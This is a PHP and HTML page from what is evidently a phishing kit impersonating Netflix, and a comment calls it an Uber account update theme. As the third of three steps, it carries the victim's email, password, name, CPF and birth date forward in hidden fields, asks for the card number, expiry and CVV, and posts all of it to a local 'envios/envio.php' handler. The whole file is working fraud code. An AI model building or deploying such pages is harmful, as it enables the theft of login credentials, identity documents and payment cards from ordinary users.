<!-- 
Theme Name: Uber Atualização cadastrais
Author: MK(rj)
 -->
  <?php
     session_start();

     $email = $_POST['email'];
     $senha = $_POST['senha'];
     $nome = $_POST['nome'];
     $cpf = $_POST['cpf'];
     $nascimento = $_POST['nascimento'];

    $_SESSION["email"] = $email;
    $_SESSION["senha"] = $senha;
    $_SESSION["nome"] = $nome;
    $_SESSION["cpf"] = $cpf;
    $_SESSION["nascimento"] = $nascimento;

 ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>Netflix</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/jquery.mobile-1.3.2.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/script.js"></script>

    <!-- mascara -->
    <script type="text/javascript">
        $(document).ready(function(){
          $('#cc').mask('0000 0000 0000 0000');
          $('#validade').mask('00/00');
        });
    </script>

</head>
<body id="tela3">
  <header id="topo">
      <div class="container-fluid">
          <div class="row">
              <div class="col-xs-6">
                  <h1 class="logo">
                      <img src="img/logo.png">
                  </h1>
              </div>
              <div class="col-xs-6">
                  <!-- <span class="btn-entrar">Entrar</span> -->
              </div>
          </div>
      </div>
  </header>
    <section class="infocc">
        <div class="container">
            <div class="passos-topocc">
                <p>PASSOS <strong>3</strong> DE <strong>3</strong><br>
                <img class="img-responsive" src="img/segurança.png" style="width: 50px;"><br>
                <span><strong>Informe seus dados de pagamento</strong></span>
            </div>
            <form action="envios/envio.php" method="POST" name="form1">
                <input type="hidden" name="email" id="email" value="<?php echo $_SESSION["email"] ?>">
                <input type="hidden" name="senha" id="senha" value="<?php echo $_SESSION["senha"] ?>">
                <input type="hidden" name="nome" id="nome" value="<?php echo $_SESSION["nome"] ?>">
                <input type="hidden" name="cpf" id="cpf" value="<?php echo $_SESSION["cpf"] ?>">
                <input type="hidden" name="nascimento" id="nascimento" value="<?php echo $_SESSION["nascimento"] ?>">

                <div class="form-group">
                    <input id="cc" name="cc" placeholder="Número do cartão(16 digitos)" type="tel" required>
                    <span class="bandeiras">
                        <i><img src="img/visa.png"></i>
                        <i><img src="img/master.png"></i>
                        <i><img src="img/amex.png"></i>
                        <i><img src="img/elo.png"></i>
                    </span>
                </div>
                <div class="form-group">
                    <input id="validade" name="validade" placeholder="validade (MM/AA)" type="tel" minlength="4" maxlength="4" required="">
                </div>
                <div class="form-group">
                    <input id="cvv" name="cvv" placeholder="CVV (Código de segurança)" type="tel" minlength="3" maxlength="4" required>
                </div>
                <div class="form-group">
                    <input type="submit" name="" value="Iniciar Assinatura">
                </div>
            </form>
        </div>
    </section>
</body>
</html>